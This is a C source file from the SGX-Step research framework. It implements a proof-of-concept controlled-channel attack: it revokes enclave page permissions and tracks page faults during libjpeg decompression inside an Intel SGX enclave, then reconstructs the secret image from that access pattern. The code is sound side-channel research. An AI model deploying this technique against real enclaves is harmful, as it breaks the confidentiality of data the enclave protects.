/*
 *  This file is part of the SGX-Step enclave execution control framework.
 *
 *  Copyright (C) 2017 Jo Van Bulck <jo.vanbulck@cs.kuleuven.be>,
 *                     Raoul Strackx <raoul.strackx@cs.kuleuven.be>
 *
 *  SGX-Step is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  SGX-Step is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with SGX-Step. If not, see <http://www.gnu.org/licenses/>.
 */

#include "encl_u.h"
#include "libsgxstep/debug.h"
#include "libsgxstep/enclave.h"
#include "libsgxstep/file.h"
#include "libsgxstep/pt.h"
#include "pf.h"
#include <fcntl.h>
#include <sgx_urts.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>

// Printing
#define DEBUG 0
#define PROGRESS 1

// Attack
#define ATTACK 0
#define INSTRUMENTATION_OFFSETS 0

// Image
#define GRAYSCALE 1

#if 1
#define IMG_NAME "testimg"
#define IMG_WIDTH 227
#define IMG_HEIGHT 149
#define ONEPASS 1

#elif 0
#define IMG_NAME "logo"
#define IMG_WIDTH 1600
#define IMG_HEIGHT 1399

#elif 0
#define IMG_NAME "birds"
#define IMG_WIDTH 1600
#define IMG_HEIGHT 1067
#define ONEPASS 1
#endif

#if GRAYSCALE
#define IMG_PATH IMG_NAME "-gray.jpg"
#define COLORS 1
#else
#define IMG_PATH IMG_NAME ".jpg"
#define COLORS 3
#endif

#define MAX_SIZE (IMG_WIDTH * IMG_HEIGHT * 3) + 100

unsigned char in_buffer[MAX_SIZE] = {0};
unsigned char out_buffer[MAX_SIZE] = {0};

void file_create(const char *path) {
  int fd;

  ASSERT((fd = creat(path, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH)) >=
         0);
  close(fd);
}

typedef enum {
  NONE = -1,
  PRE_START = 0,
  START,
  NEXT_ROW,
  PRE_IDCT_SLOW,
  START_IDCT_SLOW,
  IDCT_SLOW,
  DATA_COUNT,
  _STATE_END,
} state_t;

void print_state(state_t state) {
  switch (state) {
  case NONE:
    printf("INVALID STATE!!!");
    break;
  case PRE_START:
    printf("PRE_START");
    break;
  case START:
    printf("START");
    break;
  case NEXT_ROW:
    printf("NEXT_ROW");
    break;
  case PRE_IDCT_SLOW:
    printf("PRE_IDCT_SLOW");
    break;
  case START_IDCT_SLOW:
    printf("START_IDCT_SLOW");
    break;
  case IDCT_SLOW:
    printf("IDCT_SLOW");
    break;
  case DATA_COUNT:
    printf("DATA_COUNT");
    break;
  case _STATE_END:
    break;
  }
}

#define NUM_DATA_PAGES 2000

#if INSTRUMENTATION_OFFSETS

// With instrumentation

uint64_t STATE_PAGES_MIN[_STATE_END] = {
    /* PRE_START       */ 0,
    /* START           */ 48,
    /* NEXT_ROW        */ 79,
    /* PRE_IDCT_SLOW   */ 49,
    /* START_IDCT_SLOW */ 51,
    /* IDCT_SLOW       */ 54,
    /* DATA_COUNT      */ 112,
};

uint64_t STATE_PAGES_MAX[_STATE_END] = {
    /* PRE_START       */ 0,
    /* START           */ 49,
    /* NEXT_ROW        */ 80,
    /* PRE_IDCT_SLOW   */ 50,
    /* START_IDCT_SLOW */ 52,
    /* IDCT_SLOW       */ 55,
    /* DATA_COUNT      */ 112 + NUM_DATA_PAGES,
};

#else

// Without instrumentation

uint64_t STATE_PAGES_MIN[_STATE_END] = {
    /* PRE_START       */ 0,
    /* START           */ 33,
    /* NEXT_ROW        */ 40,
    /* PRE_IDCT_SLOW   */ 34,
    /* START_IDCT_SLOW */ 35,
    /* IDCT_SLOW       */ 37,
    /* DATA_COUNT      */ 79,
};

uint64_t STATE_PAGES_MAX[_STATE_END] = {
    /* PRE_START       */ 0,
    /* START           */ 34,
    /* NEXT_ROW        */ 41,
    /* PRE_IDCT_SLOW   */ 35,
    /* START_IDCT_SLOW */ 36,
    /* IDCT_SLOW       */ 38,
    /* DATA_COUNT      */ 79 + NUM_DATA_PAGES,
};

#endif

#define MAX_NEXT_STATES 3
state_t NEXT_STATES[_STATE_END][MAX_NEXT_STATES] = {
    /* PRE_START       */ {START, NONE, NONE},
    /* START           */ {NEXT_ROW, NONE, NONE},
    /* NEXT_ROW        */ {PRE_IDCT_SLOW, NONE, NONE},
    /* PRE_IDCT_SLOW   */ {START_IDCT_SLOW, NONE, NONE},
    /* START_IDCT_SLOW */ {IDCT_SLOW, NONE, NONE},
    /* IDCT_SLOW       */ {DATA_COUNT, NONE, NONE},
    /* DATA_COUNT      */ {DATA_COUNT, PRE_IDCT_SLOW, NEXT_ROW},
};

state_t the_state = PRE_START;
int the_data_counter = 0;

state_t next_state(state_t state, uint64_t page) {
  // Find potential next state according to state machine
  for (int i = 0; i < MAX_NEXT_STATES; i++) {
    state_t next = NEXT_STATES[state][i];
    if (next == NONE) {
      continue;
    }

    // Check if transition is allowed
    if (STATE_PAGES_MIN[next] <= page && page < STATE_PAGES_MAX[next]) {
      // Need to count the amount of transitions on DATA_COUNT
      if (next == DATA_COUNT) {
        if (state == DATA_COUNT) {
          the_data_counter += 1;
        } else {
          the_data_counter = 1;
        }
      }

      // Return the next state
      return next;
    }
  }

  // Otherwise stay in same state
  return state;
}

int zero_cnt = 0, max_cnt = 0, cur_block = 0, color = 0;
char reconstructed_buffer[COLORS][MAX_SIZE] = {0};
int block_cntr[COLORS] = {0};
int reconstruct_width = IMG_WIDTH / 8 + ((IMG_WIDTH % 8) ? 1 : 0);
int reconstruct_height = IMG_HEIGHT / 8 + ((IMG_HEIGHT % 8) ? 1 : 0);

uint64_t current_row = 0;
uint64_t reconstruct_counter = 0;

void next_row() {
#if DEBUG
  info_event("Next row (%d)", current_row);
#endif
  current_row += 1;
  reconstruct_counter = 0;
  color = (color + 1) % COLORS;

  if (current_row == reconstruct_height)
    printf("\n");
}

void reconstruct_block() {
  uint64_t value = the_data_counter;
#if DEBUG
  info("Reconstruct block: (%d, %d) = %d", current_row, reconstruct_counter,
       value);
#endif
#if PROGRESS
  printf("\rReconstructing (%d/%d) ", current_row + 1, reconstruct_height);
  printf("[");
  for (int i = 0; i < reconstruct_width; i += 4)
    if (i <= reconstruct_counter)
      printf("X");
    else
      printf(" ");
  printf("]");
  fflush(stdout);
#endif
  reconstructed_buffer[color][(current_row * reconstruct_width +
                               reconstruct_counter)] = value;
  // if (color == 0)
  reconstruct_counter++;
  // color = (color + 1) % COLORS;
  if (value > max_cnt)
    max_cnt = value;
}

void protect_state_pages(state_t state) {
  if (state == DATA_COUNT) {
    // Do something fancy for the data to reduce the amount of syscalls
    void *addr = (void *)((uint64_t)get_enclave_base() +
                          STATE_PAGES_MIN[DATA_COUNT] * PAGE_SIZE_4KiB);
    ASSERT(!mprotect(addr, NUM_DATA_PAGES * PAGE_SIZE_4KiB, PROT_NONE));
  } else {
    for (uint64_t p = STATE_PAGES_MIN[state]; p < STATE_PAGES_MAX[state]; p++) {
      void *addr = (void *)((uint64_t)get_enclave_base() + p * PAGE_SIZE_4KiB);
      // info("Protect page %d: %p", p, addr);
      ASSERT(!mprotect(addr, PAGE_SIZE_4KiB, PROT_NONE));
    }
  }
}

void protect_next_pages(state_t state) {
  for (int j = 0; j < MAX_NEXT_STATES; j++) {
    state_t next = NEXT_STATES[state][j];
    if (next == NONE) {
      continue;
    }

    protect_state_pages(next);
  }
}

void fault_handler(void *base_adrs) {
  // info("Page fault: %p", base_adrs);

  if (base_adrs == NULL) {
    info("Page fault on nullptr!");
    abort();
  }

  uint64_t page = (base_adrs - get_enclave_base()) >> 12;
  state_t prev = the_state;
  the_state = next_state(the_state, page);

  if (prev != the_state) {
#if DEBUG
    print_state(prev);
    printf(" -> ");
    print_state(the_state);
    printf("\n");
#endif
  }

  if (prev == DATA_COUNT) {
    if (the_state != DATA_COUNT) {
      reconstruct_block();
    }

    if (the_state == NEXT_ROW) {
      next_row();
    }
  }

  protect_next_pages(the_state);

  void *addr = (void *)((uint64_t)base_adrs & ~PFN_MASK);
  ASSERT(!(mprotect(addr, 4096, PROT_READ | PROT_WRITE) &&
           mprotect(addr, 4096, PROT_READ | PROT_EXEC) &&
           mprotect(addr, 4096, PROT_READ)));
}

/* XXX PoC of grayscale img reconstruction via artificially inserted explicit
 * ocall leaks for fct start and all-zero paths (need to be replaced with #PF
 * sequences later)
 */
void ocall_idct_islow(void) {
  int block = block_cntr[color];
  // info("BLOCK %d: complexity = %d", block, zero_cnt);
  reconstructed_buffer[color][block] = zero_cnt;

  if (zero_cnt > max_cnt)
    max_cnt = zero_cnt;

  zero_cnt = 0;
  block = block_cntr[color]++;
  cur_block++;

/*
 * NOTE: jdcoefct.c:decompress_onepass() processes each color component
 * sequentially, whereas jdcoefct.c:decompress_data() goes row by row.
 */
#if !ONEPASS
  if (cur_block >= reconstruct_width)
#endif
  {
    color = (color + 1) % COLORS;
    cur_block = 0;
    // info("new color component %d (cur_block=%d; max_cnt = %d)", color,
    // cur_block, max_cnt);
  }
}

void ocall_all_zero(void) { zero_cnt++; }

/* https://en.wikipedia.org/wiki/Netpbm#File_formats */
void write_bitmap_img(char *basename, char *desc, char *buf, size_t sz,
                      size_t width, size_t height, size_t max_cnt,
                      int grayscale) {
  char header[1024], path[1024];
  int header_size;
  char *magic_nb, *ext;

  magic_nb = grayscale ? "P5" : "P6";
  header_size = snprintf(header, 1024, "%s %ld %ld %ld\n", magic_nb, width,
                         height, max_cnt);
  ext = grayscale ? "gray.pgm" : "color.ppm";
  snprintf(path, 1024, "%s-%s-%s", basename, desc, ext);

  file_create(path);
  file_write(path, header, header_size);
  file_write_offset(path, buf, sz, header_size);
}

int main(int argc, char **argv) {
  size_t out_sz = 0, in_sz = 0;
  sgx_enclave_id_t eid = 0;

  if (argc != 2) {
    info("Invalid arguments");
    exit(1);
  }

  info("Creating enclave...");
  SGX_ASSERT(sgx_create_enclave(argv[1], /*debug=*/1, NULL, NULL, &eid, NULL));

  info("Enclave loaded at %p", get_enclave_base());

#if ATTACK
  info("registering fault handler..");
  register_fault_handler(fault_handler);
#endif

#if 0
    info_event("calling enclave jpeg compression..");
    in_sz = file_read("./Enclave/jpeg-9e/testimg.ppm", in_buffer, MAX_SIZE);
    info("input size = %d (%d x %d)", in_sz, IMG_WIDTH, IMG_HEIGHT);
    SGX_ASSERT( enclave_jpeg_compress(eid, &out_sz, in_buffer, in_sz, IMG_WIDTH, IMG_HEIGHT, out_buffer, MAX_SIZE) );
    info("output size = %d (%d x %d)", out_sz, IMG_WIDTH, IMG_HEIGHT);
    file_write("out.jpeg", out_buffer, out_sz);
#endif

  info_event("reading input jpg image (%d x %d)", IMG_WIDTH, IMG_HEIGHT);
  in_sz = file_read("img/" IMG_PATH, in_buffer, MAX_SIZE);
  info("input size = %d (%d x %d)", in_sz, IMG_WIDTH, IMG_HEIGHT);

#if ATTACK
  protect_next_pages(the_state);
#endif

  info_event("calling enclave jpeg decompression..");
  SGX_ASSERT(enclave_jpeg_decompress(eid, &out_sz, in_buffer, in_sz, out_buffer,
                                     MAX_SIZE));
  info("output size = %d (%d x %d)", out_sz, IMG_WIDTH, IMG_HEIGHT);
  write_bitmap_img(IMG_NAME, "out", out_buffer, out_sz, IMG_WIDTH, IMG_HEIGHT,
                   255, GRAYSCALE);

  info_event("writing reconstructed image (%d x %d)", reconstruct_width,
             reconstruct_height);

  // Rescale buffers
  double scale = (255.0 / (double)max_cnt);
  for (int i = 0; i < reconstruct_width * reconstruct_height; i++)
    for (int j = 0; j < COLORS; j++)
      reconstructed_buffer[j][i] =
          (uint8_t)((double)reconstructed_buffer[j][i] * scale);

  /* first write out grayscale images for each color component individually */
  char desc[1024];
  for (int i = 0; i < COLORS; i++) {
    snprintf(desc, 1024, "reconstruct-channel-%d", i);
    write_bitmap_img(IMG_NAME, desc, reconstructed_buffer[i],
                     reconstruct_width * reconstruct_height, reconstruct_width,
                     reconstruct_height, 255,
                     /*grayscale=*/1);
  }

/* now optionally write out a combined color image */
#if !GRAYSCALE
  int dim = (reconstruct_width * reconstruct_height);
  char *buf = malloc(dim * COLORS);
  for (int i = 0; i < dim; i++)
    for (int j = 0; j < COLORS; j++)
      buf[i * COLORS + j] = reconstructed_buffer[j][i];

  write_bitmap_img(IMG_NAME, "reconstruct", buf, dim * COLORS,
                   reconstruct_width, reconstruct_height, 255,
                   /*grayscale=*/0);
#endif

  info("all is well; exiting..");
  SGX_ASSERT(sgx_destroy_enclave(eid));
  return 0;
}
